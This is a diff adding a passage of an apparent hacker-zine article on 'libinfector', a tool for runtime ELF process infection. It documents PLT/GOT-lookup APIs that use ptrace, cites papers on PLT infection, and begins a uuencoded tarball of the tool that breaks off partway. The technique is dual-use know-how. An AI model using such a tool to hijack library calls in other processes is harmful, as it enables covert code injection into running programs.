+	  locate the GOT entry of symbol_name in elf;
+
+	int elf_file_find_symbol_plt(elf_file_struct *elf, char *symbol_name):
+	  locate the PLT entry of symbol_name in elf;
+
+	The elf_file_struct is composed by the following fields:
+
+	typedef struct
+	{
+		char            *elf_file_start;
+		Elf32_Shdr      *rel_plt_section;
+		Elf32_Shdr      *plt_section;
+		Elf32_Shdr      *dynsym_section;
+		Elf32_Shdr      *dynstr_section;
+	}elf_file_struct;
+
+	elf_file_start	: this field points to the beginning of the file mmap
+			  into the memory;
+	rel_plt_section	: points to the .rel.plt section header in the file;
+	plt_section	: points to the .plt section header in the file;
+	dynsym_section	: points to the .dynsym section header in the file;
+	dynstr_section	: points to the .synsym section header in the file;
+
+
+
+[ --- 5.3. elf_ptrace module
+
+	This modules does the same job of the elf_file module, with the
+difference that it does not utilizes the elf file, but attaches to the process
+and use its memory. The API is composed by 4 functions:
+
+	elf_ptrace_struct *elf_ptrace_new(int pid):
+	  attaches to the process identified by pid, fill the
+	  elf_ptrace_struct and returns it;
+
+	int elf_ptrace_find_symbol(elf_ptrace_struct *elf, char *sym_name, \ 
+		int plt):
+	  locate the PLT/GOT entry of sym_name in the process identified by
+	  the elf structure. plt indicates if you are searching for the PLT 
+	  entry (plt = 1) or the GOT entry (plt = 0);
+
+	int elf_ptrace_find_symbol_got(elf_ptrace_struct *elf, \
+		char *sym_name):
+	  wrapper to elf_ptrace_find_symbol(elf,sym_name,0);
+
+	int elf_ptrace_find_symbol_plt(elf_ptrace_struct *elf, \
+		char *sym_name):
+	  wrapper to elf_ptrace_find_symbol(elf,sym_name,1);
+
+	The elf_ptrace_struct is composed by the following fields:
+
+	typedef struct
+	{
+		int                     pid;
+		int                     strtab;
+		int                     symtab;
+		int                     init;
+		int                     got;
+		int                     rel_plt;
+		int                     rel_plt_size;
+	}elf_ptrace_struct;
+
+	pid		: process identification;
+	strtab		: address of the .dynstr section in the process;
+	symtab		: address of the .dynsym section in the process;
+	init		: address of the .init section in the process;
+	got		: address of the .got.plt section in the process;
+	rel_plt		: address of the .rel.plt section in the process;
+	rel_plt_size	: number of entries in the .rel.plt section;
+
+
+
+[ --- 6. References
+
+[1] - Shared Library Call Redirection Using ELF PLT Infection
+      Silvio Cesare - http://www.phiral.net/lib-redirection.txt
+
+[2] - Runtime Process Infection
+      Anonymous - http://www.phrack.org/phrack/59/p59-0x08.txt
+
+[3] - Runtime Process Infection 2
+      Ares - http://ares.x25zine.org/ES/txt/0x4553-\
+              Runtime_Process_Infecting.htm
+
+[4] - Intel386 Architecture Processor Supplement Fourth Edition
+      http://www.caldera.com/developers/devspecs/abi386-4.pdf
+
+[5] - Elf specification
+      http://x86.ddj.com/ftp/manuals/tools/elf.pdf
+
+
+
+begin 644 libinfector-1.0.tar.gz
+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
